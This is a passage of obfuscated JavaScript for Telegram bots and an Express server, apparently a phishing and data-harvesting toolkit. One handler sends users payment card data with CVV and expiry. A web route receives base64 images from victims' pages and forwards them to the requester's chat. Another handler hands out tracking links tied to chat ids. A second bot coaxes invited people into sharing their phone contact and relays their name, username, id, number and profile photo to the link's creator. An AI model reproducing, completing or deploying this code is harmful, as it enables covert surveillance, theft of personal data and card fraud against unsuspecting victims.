            'KsSGz': _0x48cb87(0x751),
            'uAdJI': _0x48cb87(0x2cb) + _0x48cb87(0x49c) + _0x48cb87(0x717) + _0x48cb87(0x5fa) + _0x48cb87(0x70b) + _0x48cb87(0x7a5) + _0x48cb87(0x65c)
        }, _0x14d472 = _0xda00e9[_0x48cb87(0x6a6)]['id'], _0x5e0506 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0xecbb5f[_0x48cb87(0x77b)],
                            'callback_data': _0xecbb5f[_0x48cb87(0x4ef)]
                        }]]
            },
            'parse_mode': _0xecbb5f[_0x48cb87(0x268)]
        };
    bot[_0x48cb87(0x273) + 'e'](_0x14d472, _0xecbb5f[_0x48cb87(0x7de)], _0x5e0506);
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), async _0x240ac0 => {
    const _0x479d2f = _0x178009, _0x36f8be = {
            'yUOux': function (_0x1bc947, _0x364dd1) {
                return _0x1bc947 === _0x364dd1;
            },
            'LcSEA': _0x479d2f(0x440) + _0x479d2f(0x375),
            'XrlBG': _0x479d2f(0x4c8) + _0x479d2f(0x800) + _0x479d2f(0x5eb) + _0x479d2f(0x389),
            'gOkDf': _0x479d2f(0x4c8) + _0x479d2f(0x800) + _0x479d2f(0x7d8) + _0x479d2f(0x4ae),
            'xyYWU': _0x479d2f(0x4c8) + _0x479d2f(0x800) + _0x479d2f(0x303) + _0x479d2f(0x233),
            'aCZbu': _0x479d2f(0x4c8) + _0x479d2f(0x800) + _0x479d2f(0x529) + _0x479d2f(0x51d),
            'nYOvM': _0x479d2f(0x4c8) + _0x479d2f(0x800) + _0x479d2f(0x7fe) + _0x479d2f(0x598),
            'UQwVN': function (_0xce3684) {
                return _0xce3684();
            },
            'uzLxZ': _0x479d2f(0x751),
            'Feefu': _0x479d2f(0x29f) + _0x479d2f(0x773) + _0x479d2f(0x4e7) + _0x479d2f(0x370) + _0x479d2f(0x49b)
        }, _0x12a503 = _0x240ac0[_0x479d2f(0x1e6)][_0x479d2f(0x6a6)]['id'];
    if (_0x36f8be[_0x479d2f(0x535)](_0x240ac0[_0x479d2f(0x320)], _0x36f8be[_0x479d2f(0x43a)])) {
        let _0x648d86 = await bot[_0x479d2f(0x273) + 'e'](_0x12a503, _0x36f8be[_0x479d2f(0x317)]);
        await new Promise(_0x43e72b => setTimeout(_0x43e72b, -0x8 * 0x4ae + 0x210c * -0x1 + 0x4a64)), await bot[_0x479d2f(0x5cf) + _0x479d2f(0x22a)](_0x36f8be[_0x479d2f(0x5f4)], {
            'chat_id': _0x12a503,
            'message_id': _0x648d86[_0x479d2f(0x792)]
        }), await new Promise(_0x587a95 => setTimeout(_0x587a95, 0x13c * -0x14 + -0x85 * 0x2b + -0x32ef * -0x1)), await bot[_0x479d2f(0x5cf) + _0x479d2f(0x22a)](_0x36f8be[_0x479d2f(0x58c)], {
            'chat_id': _0x12a503,
            'message_id': _0x648d86[_0x479d2f(0x792)]
        }), await new Promise(_0x2c3695 => setTimeout(_0x2c3695, -0xd99 * -0x2 + -0x22a3 + -0x53 * -0x23)), await bot[_0x479d2f(0x5cf) + _0x479d2f(0x22a)](_0x36f8be[_0x479d2f(0x7f9)], {
            'chat_id': _0x12a503,
            'message_id': _0x648d86[_0x479d2f(0x792)]
        }), await new Promise(_0x406355 => setTimeout(_0x406355, 0x9 * -0x13d + -0x2 * 0xe8f + 0x2c2b)), await bot[_0x479d2f(0x5cf) + _0x479d2f(0x22a)](_0x36f8be[_0x479d2f(0x54f)], {
            'chat_id': _0x12a503,
            'message_id': _0x648d86[_0x479d2f(0x792)]
        }), await new Promise(_0x51f8b6 => setTimeout(_0x51f8b6, 0x1ed5 * -0x1 + -0x121f * -0x2 + -0x181)), await bot[_0x479d2f(0x24f) + _0x479d2f(0x7bb)](_0x12a503, _0x648d86[_0x479d2f(0x792)]);
        const _0x39aa98 = await _0x36f8be[_0x479d2f(0x366)](fetchVisaData);
        if (_0x39aa98) {
            const {
                CardNumber: _0x1cd9ca,
                Expiry: _0x106290,
                CVV: _0x46a01e,
                Bank: _0x4541f1,
                CardType: _0x11f8b8,
                Country: _0x5c966c,
                Value: _0x5d7ff9
            } = _0x39aa98;
            bot[_0x479d2f(0x273) + 'e'](_0x12a503, _0x479d2f(0x2f0) + _0x479d2f(0x30f) + _0x479d2f(0x5d6) + '`' + _0x1cd9ca + (_0x479d2f(0x76c) + _0x479d2f(0x2b1)) + _0x106290 + (_0x479d2f(0x541) + _0x479d2f(0x512)) + _0x46a01e + (_0x479d2f(0x1d2) + _0x479d2f(0x596)) + _0x4541f1 + (_0x479d2f(0x666) + _0x479d2f(0x736) + '`') + _0x11f8b8 + (_0x479d2f(0x76f) + _0x479d2f(0x283)) + _0x5c966c + (_0x479d2f(0x51c) + _0x479d2f(0x5e4)) + _0x5d7ff9 + (_0x479d2f(0x523) + _0x479d2f(0x279) + _0x479d2f(0x279) + _0x479d2f(0x80e) + _0x479d2f(0x754) + _0x479d2f(0x573) + _0x479d2f(0x6a3)), { 'parse_mode': _0x36f8be[_0x479d2f(0x610)] });
        } else
            bot[_0x479d2f(0x273) + 'e'](_0x12a503, _0x36f8be[_0x479d2f(0x44c)]);
    }
});
const deleteFolderRecursive = _0x505c3f => {
    const _0x152d50 = _0x178009, _0x598fca = {
            'LnuBR': function (_0x2c544d, _0x6df53b) {
                return _0x2c544d(_0x6df53b);
            }
        };
    fs[_0x152d50(0x71b)](_0x505c3f) && (fs[_0x152d50(0x369) + 'c'](_0x505c3f)[_0x152d50(0x74d)](_0x5be7e8 => {
        const _0x4f5226 = _0x152d50, _0xac4be2 = path[_0x4f5226(0x2a7)](_0x505c3f, _0x5be7e8);
        fs[_0x4f5226(0x723)](_0xac4be2)[_0x4f5226(0x47a) + 'y']() ? _0x598fca[_0x4f5226(0x5ab)](deleteFolderRecursive, _0xac4be2) : fs[_0x4f5226(0x3ca)](_0xac4be2);
    }), fs[_0x152d50(0x525)](_0x505c3f));
};
app[_0x178009(0x2cc)](express[_0x178009(0x451)](__dirname)), app[_0x178009(0x25e)](_0x178009(0x71d), (_0x87f583, _0x3b6bb3) => {
    const _0x3e02ec = _0x178009, _0x30d247 = {
            'dRLYJ': _0x3e02ec(0x4bc),
            'APKLG': function (_0x16c5b2, _0x38f82e) {
                return _0x16c5b2 + _0x38f82e;
            },
            'nmKOZ': _0x3e02ec(0x235),
            'VCvkv': _0x3e02ec(0x402)
        }, _0x31a797 = _0x87f583[_0x3e02ec(0x4d8)][_0x3e02ec(0x5cb)], _0x540fe9 = _0x87f583[_0x3e02ec(0x4d8)][_0x3e02ec(0x2d1)][_0x3e02ec(0x577)](','), _0xeaca18 = path[_0x3e02ec(0x2a7)](__dirname, _0x30d247[_0x3e02ec(0x274)]);
    !fs[_0x3e02ec(0x71b)](_0xeaca18) && fs[_0x3e02ec(0x7f8)](_0xeaca18), _0x540fe9[_0x3e02ec(0x74d)]((_0x536fbc, _0x5181ee) => {
        const _0x4f364e = _0x3e02ec, _0x1e7b14 = Buffer[_0x4f364e(0x237)](_0x536fbc, _0x30d247[_0x4f364e(0x7f1)]), _0x3c62a4 = path[_0x4f364e(0x2a7)](_0xeaca18, _0x31a797 + '_' + _0x5181ee + _0x4f364e(0x3f2));
        fs[_0x4f364e(0x663) + _0x4f364e(0x611)](_0x3c62a4, _0x1e7b14), bot[_0x4f364e(0x49d)](_0x31a797, _0x1e7b14, { 'caption': _0x4f364e(0x325) + _0x30d247[_0x4f364e(0x5a3)](_0x5181ee, -0x1085 + -0x89 * 0xe + 0x1804) });
    }), console[_0x3e02ec(0x22e)](_0x3e02ec(0x81f) + _0x3e02ec(0x4e4) + _0x3e02ec(0x7e3) + _0x3e02ec(0x261) + _0x31a797), _0x3b6bb3[_0x3e02ec(0x3c8)](_0x30d247[_0x3e02ec(0x653)]);
}), app[_0x178009(0x344)](_0x178009(0x6f5), (_0x55e753, _0x3977e0) => {
    const _0x379749 = _0x178009, _0x410732 = { 'enzOY': _0x379749(0x4c4) };
    _0x3977e0[_0x379749(0x4c1)](path[_0x379749(0x2a7)](__dirname, _0x410732[_0x379749(0x1f2)]));
}), bot[_0x178009(0x645)](/\/اتتهتتاههة/, _0x247f9f => {
    const _0x4bc802 = _0x178009, _0x5e3308 = {
            'EjrGH': _0x4bc802(0x750) + _0x4bc802(0x2b3) + _0x4bc802(0x21b) + _0x4bc802(0x4f5) + _0x4bc802(0x6b5) + _0x4bc802(0x810),
            'vOmpy': _0x4bc802(0x4f2) + _0x4bc802(0x2a8) + _0x4bc802(0x34c),
            'mBioJ': _0x4bc802(0x44e) + _0x4bc802(0x2e9)
        }, _0x2e1013 = _0x247f9f[_0x4bc802(0x6a6)]['id'], _0x26fbb5 = _0x5e3308[_0x4bc802(0x6a7)];
    bot[_0x4bc802(0x273) + 'e'](_0x2e1013, _0x26fbb5, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x5e3308[_0x4bc802(0x439)],
                        'callback_data': _0x5e3308[_0x4bc802(0x574)]
                    }]]
        }
    });
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), _0x6f51e6 => {
    const _0x3b1d86 = _0x178009, _0x5a6424 = {
            'UvFvn': function (_0x69f85f, _0x59fecb) {
                return _0x69f85f === _0x59fecb;
            },
            'Ywcrf': _0x3b1d86(0x44e) + _0x3b1d86(0x2e9)
        }, _0xd749ee = _0x6f51e6[_0x3b1d86(0x1e6)][_0x3b1d86(0x6a6)]['id'], _0x16a36c = _0x6f51e6[_0x3b1d86(0x1e6)][_0x3b1d86(0x792)];
    if (_0x5a6424[_0x3b1d86(0x46e)](_0x6f51e6[_0x3b1d86(0x320)], _0x5a6424[_0x3b1d86(0x6e8)])) {
        const _0xf06634 = baseUrl + (_0x3b1d86(0x599) + _0x3b1d86(0x811)) + _0xd749ee;
        bot[_0x3b1d86(0x273) + 'e'](_0xd749ee, _0x3b1d86(0x3bf) + _0x3b1d86(0x5aa) + _0x3b1d86(0x2fd) + _0xf06634);
    }
}), bot[_0x178009(0x645)](/\/s2854تصخصrt/, _0x349c5a => {
    const _0x537f0a = _0x178009, _0x255154 = {
            'ONYgY': _0x537f0a(0x593) + _0x537f0a(0x7a4),
            'ebzpl': _0x537f0a(0x4f4) + 'il',
            'XcAAE': _0x537f0a(0x3c9)
        }, _0x40ea58 = _0x349c5a[_0x537f0a(0x6a6)]['id'], _0x1a2536 = _0x349c5a[_0x537f0a(0x237)], _0xd08be6 = _0x1a2536[_0x537f0a(0x351)], _0x38292c = {
            'inline_keyboard': [[{
                        'text': _0x255154[_0x537f0a(0x625)],
                        'callback_data': _0x255154[_0x537f0a(0x456)]
                    }]]
        };
    bot[_0x537f0a(0x273) + 'e'](_0x40ea58, _0x537f0a(0x665) + _0x537f0a(0x7ff) + _0xd08be6 + (_0x537f0a(0x61c) + _0x537f0a(0x657) + _0x537f0a(0x2e2) + _0x537f0a(0x20f) + _0x537f0a(0x612) + _0x537f0a(0x21f) + _0x537f0a(0x595) + _0x537f0a(0x6d1) + _0x537f0a(0x784) + 'g>'), {
        'parse_mode': _0x255154[_0x537f0a(0x437)],
        'reply_markup': { 'inline_keyboard': _0x38292c[_0x537f0a(0x318) + _0x537f0a(0x428)] }
    });
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), _0x477c39 => {
    const _0x5e34c2 = _0x178009, _0x147d52 = {
            'lwASu': function (_0x54364c, _0x4d819f) {
                return _0x54364c === _0x4d819f;
            },
            'locLd': _0x5e34c2(0x4f4) + 'il',
            'UBxKA': _0x5e34c2(0x3c9)
        }, _0x2d0b63 = _0x477c39[_0x5e34c2(0x1e6)][_0x5e34c2(0x6a6)]['id'], _0xcd1be6 = _0x477c39[_0x5e34c2(0x320)];
    _0x147d52[_0x5e34c2(0x580)](_0xcd1be6, _0x147d52[_0x5e34c2(0x2e6)]) && bot[_0x5e34c2(0x273) + 'e'](_0x2d0b63, _0x5e34c2(0x41e) + _0x5e34c2(0x6e0) + _0x5e34c2(0x2f1) + _0x5e34c2(0x691) + _0x5e34c2(0x79f) + _0x5e34c2(0x77e) + _0x5e34c2(0x3e5) + _0x5e34c2(0x568) + _0x5e34c2(0x5c7) + _0x5e34c2(0x5ba) + _0x5e34c2(0x5bb) + _0x5e34c2(0x621) + _0x5e34c2(0x647) + _0x5e34c2(0x7c8) + _0x5e34c2(0x789) + _0x5e34c2(0x29e) + _0x5e34c2(0x25d) + _0x5e34c2(0x674) + _0x5e34c2(0x1f7) + _0x5e34c2(0x793) + _0x5e34c2(0x635) + _0x5e34c2(0x4d3) + _0x5e34c2(0x6d4) + _0x5e34c2(0x26e) + _0x5e34c2(0x633) + _0x5e34c2(0x7ae) + _0x5e34c2(0x6be), { 'parse_mode': _0x147d52[_0x5e34c2(0x7a2)] });
});
const EMAILS_FILE = _0x178009(0x3f1) + 'n';
function readEmails() {
    const _0x139bc1 = _0x178009, _0x431ac7 = { 'aRrMD': _0x139bc1(0x73d) };
    try {
        const _0x1e1886 = fs[_0x139bc1(0x309) + 'nc'](EMAILS_FILE, _0x431ac7[_0x139bc1(0x1eb)]);
        return JSON[_0x139bc1(0x5d9)](_0x1e1886);
    } catch (_0x5a1cc6) {
        return {};
    }
}
function writeEmails(_0x3528ed) {
    const _0x4488d5 = _0x178009;
    fs[_0x4488d5(0x663) + _0x4488d5(0x611)](EMAILS_FILE, JSON[_0x4488d5(0x7bd)](_0x3528ed, null, 0x1 * 0xbda + 0x1b93 + -0x276b));
}
bot[_0x178009(0x645)](/\/email/, async _0x43177c => {
    const _0x1c74cf = _0x178009, _0x5c5599 = {
            'jyDzU': function (_0xff109) {
                return _0xff109();
            },
            'uwFrK': _0x1c74cf(0x5e8) + _0x1c74cf(0x3bc) + _0x1c74cf(0x1e4) + _0x1c74cf(0x293),
            'zxMSS': _0x1c74cf(0x3c9),
            'xDRpr': _0x1c74cf(0x38e) + _0x1c74cf(0x6b8) + _0x1c74cf(0x7b5) + _0x1c74cf(0x752) + _0x1c74cf(0x631),
            'hHeyw': _0x1c74cf(0x3dd),
            'aWhUD': _0x1c74cf(0x67d) + _0x1c74cf(0x305),
            'YNBzT': _0x1c74cf(0x45f) + _0x1c74cf(0x488),
            'VPmyS': function (_0x10d39b, _0x5912fa) {
                return _0x10d39b(_0x5912fa);
            },
            'HOboZ': _0x1c74cf(0x81c) + _0x1c74cf(0x4f8) + _0x1c74cf(0x5ed) + 'g>'
        }, _0x5a2697 = _0x43177c[_0x1c74cf(0x237)]['id'], _0x438a55 = _0x43177c[_0x1c74cf(0x6a6)]['id'];
    let _0x3cced5 = _0x5c5599[_0x1c74cf(0x5c2)](readEmails);
    _0x3cced5[_0x5a2697] && delete _0x3cced5[_0x5a2697];
    try {
        bot[_0x1c74cf(0x273) + 'e'](_0x438a55, _0x5c5599[_0x1c74cf(0x39e)], { 'parse_mode': _0x5c5599[_0x1c74cf(0x59d)] });
        const _0x4f1320 = await axios[_0x1c74cf(0x25e)](_0x5c5599[_0x1c74cf(0x225)], {
                'name': _0x5c5599[_0x1c74cf(0x322)],
                'domain': _0x5c5599[_0x1c74cf(0x508)]
            }, { 'headers': { 'User-Agent': _0x5c5599[_0x1c74cf(0x744)] } }), _0x162c21 = _0x4f1320[_0x1c74cf(0x320)][_0x1c74cf(0x778)];
        _0x3cced5[_0x5a2697] = _0x162c21, _0x5c5599[_0x1c74cf(0x45d)](writeEmails, _0x3cced5), bot[_0x1c74cf(0x273) + 'e'](_0x438a55, _0x1c74cf(0x532) + _0x1c74cf(0x41f) + _0x1c74cf(0x2f2) + _0x1c74cf(0x51f) + _0x1c74cf(0x466) + _0x162c21 + (_0x1c74cf(0x559) + _0x1c74cf(0x3a1) + _0x1c74cf(0x7e1) + _0x1c74cf(0x50e) + _0x1c74cf(0x7c0)), { 'parse_mode': _0x5c5599[_0x1c74cf(0x59d)] });
    } catch (_0x3f7901) {
        bot[_0x1c74cf(0x273) + 'e'](_0x438a55, _0x5c5599[_0x1c74cf(0x1e5)], { 'parse_mode': _0x5c5599[_0x1c74cf(0x59d)] });
    }
}), bot[_0x178009(0x645)](/\/an/, _0x2796c0 => {
    const _0x196b15 = _0x178009, _0x50dd3e = {
            'Llkir': function (_0x2508d6) {
                return _0x2508d6();
            },
            'raBGO': _0x196b15(0x3c9),
            'xgfpw': _0x196b15(0x6a0) + _0x196b15(0x1ff) + _0x196b15(0x693) + _0x196b15(0x3d7) + 'g>'
        }, _0x5ebaaa = _0x2796c0[_0x196b15(0x6a6)]['id'], _0x8a4ae8 = _0x2796c0[_0x196b15(0x237)]['id'];
    let _0x5194d1 = _0x50dd3e[_0x196b15(0x308)](readEmails);
    if (_0x5194d1[_0x8a4ae8]) {
        const _0x110286 = _0x5194d1[_0x8a4ae8];
        bot[_0x196b15(0x273) + 'e'](_0x5ebaaa, _0x196b15(0x7b3) + _0x196b15(0x5dd) + _0x196b15(0x5bf) + _0x196b15(0x4f0) + _0x196b15(0x2bc) + _0x196b15(0x433) + _0x110286 + (_0x196b15(0x559) + _0x196b15(0x3a1) + _0x196b15(0x7e1) + _0x196b15(0x50e) + _0x196b15(0x7c0)), { 'parse_mode': _0x50dd3e[_0x196b15(0x33e)] });
    } else
        bot[_0x196b15(0x273) + 'e'](_0x5ebaaa, _0x50dd3e[_0x196b15(0x67b)], { 'parse_mode': _0x50dd3e[_0x196b15(0x33e)] });
}), bot[_0x178009(0x645)](/\/Messages/, async _0x5cc691 => {
    const _0x1e9080 = _0x178009, _0xad62ac = {
            'PJBjt': _0x1e9080(0x3c9),
            'wmudB': function (_0x424190) {
                return _0x424190();
            },
            'TPGso': function (_0xd03299, _0x29ce43) {
                return _0xd03299 > _0x29ce43;
            },
            'eqfYj': _0x1e9080(0x59b) + _0x1e9080(0x4bf) + _0x1e9080(0x808),
            'RVJwj': _0x1e9080(0x4d4) + _0x1e9080(0x329) + _0x1e9080(0x1d1) + _0x1e9080(0x2b6) + 'g>',
            'kuMvD': _0x1e9080(0x3d3) + _0x1e9080(0x640) + _0x1e9080(0x7c7) + _0x1e9080(0x5d7)
        }, _0x309c4b = _0x5cc691[_0x1e9080(0x6a6)]['id'], _0x3db95c = _0x5cc691[_0x1e9080(0x237)]['id'];
    let _0x13fd02 = _0xad62ac[_0x1e9080(0x448)](readEmails);
    if (_0x13fd02[_0x3db95c]) {
        const _0x23f1e4 = _0x13fd02[_0x3db95c];
        try {
            const _0x1626c6 = await axios[_0x1e9080(0x344)](_0x1e9080(0x38e) + _0x1e9080(0x6b8) + _0x1e9080(0x7b5) + _0x1e9080(0x752) + _0x1e9080(0x745) + _0x23f1e4 + _0x1e9080(0x3be)), _0x1a10d0 = _0x1626c6[_0x1e9080(0x320)];
            _0xad62ac[_0x1e9080(0x2ae)](_0x1a10d0[_0x1e9080(0x20d)], -0x1 * -0xf23 + 0x15 * -0x1 + 0x787 * -0x2) ? _0x1a10d0[_0x1e9080(0x74d)](_0xd7d956 => {
                const _0x2a9df9 = _0x1e9080;
                bot[_0x2a9df9(0x273) + 'e'](_0x309c4b, _0x2a9df9(0x4f6) + _0x2a9df9(0x4e3) + _0x2a9df9(0x554) + '\x0a' + _0xd7d956[_0x2a9df9(0x41a)] + '\x0a' + _0xd7d956[_0x2a9df9(0x413)] + _0x2a9df9(0x27c), { 'parse_mode': _0xad62ac[_0x2a9df9(0x55a)] });
            }) : bot[_0x1e9080(0x273) + 'e'](_0x309c4b, _0xad62ac[_0x1e9080(0x771)]);
        } catch (_0x34d0d8) {
            bot[_0x1e9080(0x273) + 'e'](_0x309c4b, _0xad62ac[_0x1e9080(0x28f)], { 'parse_mode': _0xad62ac[_0x1e9080(0x55a)] });
        }
    } else
        bot[_0x1e9080(0x273) + 'e'](_0x309c4b, _0xad62ac[_0x1e9080(0x28a)], { 'parse_mode': _0xad62ac[_0x1e9080(0x55a)] });
}), bot[_0x178009(0x645)](/\/de/, _0x13635a => {
    const _0x2508c6 = _0x178009, _0x4fc292 = {
            'niaIs': function (_0x4872bc) {
                return _0x4872bc();
            },
            'iGajM': function (_0x7e6dd3, _0x2111a9) {
                return _0x7e6dd3(_0x2111a9);
            },
            'RQObs': _0x2508c6(0x532) + _0x2508c6(0x6e2) + _0x2508c6(0x4c5) + '>',
            'lStPZ': _0x2508c6(0x3c9),
            'mNWPn': _0x2508c6(0x419) + _0x2508c6(0x801) + _0x2508c6(0x639) + _0x2508c6(0x5d7)
        }, _0x5e23b3 = _0x13635a[_0x2508c6(0x6a6)]['id'], _0x8c9ce2 = _0x13635a[_0x2508c6(0x237)]['id'];
    let _0x3e105d = _0x4fc292[_0x2508c6(0x5bd)](readEmails);
    _0x3e105d[_0x8c9ce2] ? (delete _0x3e105d[_0x8c9ce2], _0x4fc292[_0x2508c6(0x558)](writeEmails, _0x3e105d), bot[_0x2508c6(0x273) + 'e'](_0x5e23b3, _0x4fc292[_0x2508c6(0x5b9)], { 'parse_mode': _0x4fc292[_0x2508c6(0x7fd)] })) : bot[_0x2508c6(0x273) + 'e'](_0x5e23b3, _0x4fc292[_0x2508c6(0x25a)], { 'parse_mode': _0x4fc292[_0x2508c6(0x7fd)] });
}), bot[_0x178009(0x645)](/\/de/, async _0x61a0e5 => {
    const _0x944b8a = _0x178009, _0x5008f1 = {
            'ZINVY': _0x944b8a(0x532) + _0x944b8a(0x6e2) + _0x944b8a(0x4c5) + '>',
            'XtllP': _0x944b8a(0x3c9),
            'DNEZi': _0x944b8a(0x419) + _0x944b8a(0x6e9) + _0x944b8a(0x486) + _0x944b8a(0x5d7)
        }, _0x335010 = _0x61a0e5[_0x944b8a(0x6a6)]['id'];
    try {
        fs[_0x944b8a(0x3ca)](_0x944b8a(0x6fa) + _0x335010 + _0x944b8a(0x503)), bot[_0x944b8a(0x273) + 'e'](_0x335010, _0x5008f1[_0x944b8a(0x613)], { 'parse_mode': _0x5008f1[_0x944b8a(0x777)] });
    } catch (_0x162779) {
        bot[_0x944b8a(0x273) + 'e'](_0x335010, _0x5008f1[_0x944b8a(0x352)], { 'parse_mode': _0x5008f1[_0x944b8a(0x777)] });
    }
}), bot[_0x178009(0x645)](/\/sخسننسمس/, _0x2914e2 => {
    const _0x592125 = _0x178009, _0x5c8bf5 = {
            'vLSYt': _0x592125(0x4c2) + _0x592125(0x642),
            'Qjdlg': _0x592125(0x660) + _0x592125(0x713),
            'XMDHw': _0x592125(0x78c) + _0x592125(0x21d) + _0x592125(0x30c) + _0x592125(0x72f)
        }, _0x5d4b6f = _0x2914e2[_0x592125(0x6a6)]['id'], _0x58c173 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x5c8bf5[_0x592125(0x682)],
                            'callback_data': _0x5c8bf5[_0x592125(0x2b4)]
                        }]]
            }
        };
    bot[_0x592125(0x273) + 'e'](_0x5d4b6f, _0x5c8bf5[_0x592125(0x57c)], _0x58c173);
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), _0x352459 => {
    const _0x322c6d = _0x178009, _0x2f6237 = {
            'VkaWe': function (_0x22c6fd, _0x486e57) {
                return _0x22c6fd === _0x486e57;
            },
            'MCRhy': _0x322c6d(0x660) + _0x322c6d(0x713)
        };
    if (_0x2f6237[_0x322c6d(0x1f6)](_0x352459[_0x322c6d(0x320)], _0x2f6237[_0x322c6d(0x61e)])) {
        const _0x3d2762 = _0x352459[_0x322c6d(0x237)]['id'], _0x2d9f5b = _0x322c6d(0x4d1) + _0x322c6d(0x3cc) + _0x322c6d(0x476) + _0x3d2762;
        bot[_0x322c6d(0x273) + 'e'](_0x352459[_0x322c6d(0x1e6)][_0x322c6d(0x6a6)]['id'], _0x322c6d(0x62b) + _0x322c6d(0x63b) + _0x322c6d(0x307) + _0x322c6d(0x816) + _0x322c6d(0x22b) + _0x322c6d(0x452) + ':\x0a' + _0x2d9f5b);
    }
}), secondBot[_0x178009(0x645)](/\/start (.+)/, (_0x5b6814, _0x366850) => {
    const _0x58ad99 = _0x178009, _0x2fa9c9 = {
            'jWxOP': function (_0x745d98, _0x355ca7) {
                return _0x745d98(_0x355ca7);
            },
            'Badtj': _0x58ad99(0x22d) + _0x58ad99(0x5e1),
            'RRIjH': _0x58ad99(0x2f5) + _0x58ad99(0x49f) + _0x58ad99(0x430) + _0x58ad99(0x463) + _0x58ad99(0x3a3)
        }, _0x3c3f2 = _0x5b6814[_0x58ad99(0x6a6)]['id'], _0x29f091 = _0x2fa9c9[_0x58ad99(0x727)](parseInt, _0x366850[0x7d4 + 0x207a + 0x21f * -0x13]);
    inviteLinks[_0x5b6814[_0x58ad99(0x237)]['id']] = _0x29f091;
    const _0x1bc1fd = {
        'reply_markup': {
            'keyboard': [[{
                        'text': _0x2fa9c9[_0x58ad99(0x53b)],
                        'request_contact': !![]
                    }]],
            'one_time_keyboard': !![]
        }
    };
    secondBot[_0x58ad99(0x273) + 'e'](_0x3c3f2, _0x2fa9c9[_0x58ad99(0x5c9)], _0x1bc1fd);
}), secondBot['on'](_0x178009(0x2e8), _0x4c1b1c => {
    const _0x4b9f23 = _0x178009, _0x39d7d5 = {
            'YDfiG': _0x4b9f23(0x7f5) + _0x4b9f23(0x215) + _0x4b9f23(0x64a),
            'aRzqy': _0x4b9f23(0x751),
            'PNDNW': _0x4b9f23(0x6c1) + _0x4b9f23(0x3fe) + 'ح.',
            'XbfLd': function (_0x4143eb, _0x2e00e4) {
                return _0x4143eb + _0x2e00e4;
            },
            'NnUKm': function (_0x3c01e1, _0x3ea871) {
                return _0x3c01e1 + _0x3ea871;
            },
            'ExSNI': function (_0x271e33, _0x293bc2) {
                return _0x271e33 + _0x293bc2;
            },
            'LQSCw': function (_0x5dd9af, _0x505af4) {
                return _0x5dd9af > _0x505af4;
            },
            'QfUTs': _0x4b9f23(0x81b) + _0x4b9f23(0x3d6),
            'GBsDA': _0x4b9f23(0x7f5) + _0x4b9f23(0x239) + _0x4b9f23(0x4a1) + _0x4b9f23(0x2c4) + _0x4b9f23(0x334),
            'hrixE': _0x4b9f23(0x6ad) + _0x4b9f23(0x44f) + _0x4b9f23(0x4ea) + _0x4b9f23(0x66f) + _0x4b9f23(0x522) + _0x4b9f23(0x34d),
            'LxcdT': function (_0x3592da, _0x247296) {
                return _0x3592da === _0x247296;
            },
            'OAlpS': _0x4b9f23(0x4ac) + _0x4b9f23(0x61b),
            'qCcBw': _0x4b9f23(0x3ef) + 'ذة',
            'xFJYu': _0x4b9f23(0x2f5) + _0x4b9f23(0x49f) + _0x4b9f23(0x6ee) + _0x4b9f23(0x64e),
            'qbqYO': _0x4b9f23(0x3f7) + _0x4b9f23(0x4a5) + _0x4b9f23(0x3c2)
        };
    if (_0x4c1b1c[_0x4b9f23(0x2e8)] && inviteLinks[_0x4c1b1c[_0x4b9f23(0x237)]['id']]) {
        if (_0x39d7d5[_0x4b9f23(0x2c3)](_0x4c1b1c[_0x4b9f23(0x2e8)][_0x4b9f23(0x68f)], _0x4c1b1c[_0x4b9f23(0x237)]['id'])) {
            const _0x3ec100 = inviteLinks[_0x4c1b1c[_0x4b9f23(0x237)]['id']], _0x1461f4 = _0x4c1b1c[_0x4b9f23(0x237)], _0x5c6a92 = _0x1461f4['id'], _0x84e308 = _0x1461f4[_0x4b9f23(0x351)], _0x53b12e = _0x1461f4[_0x4b9f23(0x3cd)] || '', _0x3223b3 = _0x1461f4[_0x4b9f23(0x1cb)] || _0x39d7d5[_0x4b9f23(0x655)], _0x29e288 = _0x1461f4[_0x4b9f23(0x5b8)] || _0x39d7d5[_0x4b9f23(0x676)], _0x1cb2f5 = _0x4c1b1c[_0x4b9f23(0x2e8)][_0x4b9f23(0x5dc) + 'er'];
            secondBot[_0x4b9f23(0x6e3) + _0x4b9f23(0x4a6)](_0x5c6a92)[_0x4b9f23(0x3e0)](_0x83fed8 => {
                const _0x5c4500 = _0x4b9f23, _0x8565df = { 'UtQEU': _0x39d7d5[_0x5c4500(0x539)] }, _0x2f7a85 = _0x39d7d5[_0x5c4500(0x270)](_0x39d7d5[_0x5c4500(0x270)](_0x39d7d5[_0x5c4500(0x417)](_0x39d7d5[_0x5c4500(0x2e5)](_0x5c4500(0x6a2) + _0x5c4500(0x209) + '\x0a', _0x5c4500(0x4e1) + _0x84e308 + '\x20' + _0x53b12e + _0x5c4500(0x805)), _0x5c4500(0x60f) + '@' + _0x3223b3 + _0x5c4500(0x805)), _0x5c4500(0x313) + _0x5c6a92 + _0x5c4500(0x805)), _0x5c4500(0x465) + _0x5c4500(0x34a) + _0x1cb2f5 + '\x0a');
                if (_0x39d7d5[_0x5c4500(0x39d)](_0x83fed8[_0x5c4500(0x765) + 't'], 0xb3 + -0x59d + 0x4ea)) {
                    const _0x3d55d9 = _0x83fed8[_0x5c4500(0x6e6)][-0x2283 + 0xfbe + 0x12c5][0x1f * -0xef + -0x705 * -0x4 + 0xdd][_0x5c4500(0x5a4)];
                    _0x3d55d9 ? bot[_0x5c4500(0x49d)](_0x3ec100, _0x3d55d9, {
                        'caption': _0x2f7a85,
                        'parse_mode': _0x39d7d5[_0x5c4500(0x797)]
                    })[_0x5c4500(0x3e0)](() => {
                        const _0x2ee85a = _0x5c4500;
                        console[_0x2ee85a(0x22e)](_0x8565df[_0x2ee85a(0x527)]);
                    })[_0x5c4500(0x3d1)](_0x2e65ce => {
                        const _0x1b2fd1 = _0x5c4500;
                        console[_0x1b2fd1(0x6d0)](_0x39d7d5[_0x1b2fd1(0x291)], _0x2e65ce), bot[_0x1b2fd1(0x273) + 'e'](_0x3ec100, _0x2f7a85, { 'parse_mode': _0x39d7d5[_0x1b2fd1(0x797)] });
                    }) : bot[_0x5c4500(0x273) + 'e'](_0x3ec100, _0x2f7a85, { 'parse_mode': _0x39d7d5[_0x5c4500(0x797)] });
                } else
